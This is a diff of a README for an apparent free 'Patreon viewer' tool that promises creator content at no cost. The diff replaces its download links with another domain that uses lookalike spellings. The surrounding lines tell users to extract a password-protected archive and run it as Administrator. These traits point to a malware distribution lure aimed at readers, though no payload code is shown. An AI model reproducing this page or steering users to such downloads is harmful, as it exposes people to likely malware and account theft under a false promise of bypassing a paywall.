@@ -9,7 +9,7 @@ The **🧩 All-in-One Patreon Viewer** is a **free** comprehensive discovery sui
 
 <div align="center">
 
-[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/all-in-one-patre0n-viewe7)
+[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/all-in-one-patre0n-viewe7)
 
 </div>
 
@@ -112,7 +112,7 @@ Finding quality creators on Patreon takes hours of browsing. This all-in-one sui
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Complete setup → Launch
 
-[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/all-in-one-patre0n-viewe7)
+[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/all-in-one-patre0n-viewe7)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -267,7 +267,7 @@ Discover Patreon creators like never before — for free. **All-in-One Patreon V
 
 <div align="center">
 
-[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/all-in-one-patre0n-viewe7)
+[![Download All-in-One Patreon Viewer](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/all-in-one-patre0n-viewe7)
 
 **Version 4.6.1** — All-in-one discovery suite. April 2026 update. Zero cost. No payment.
 
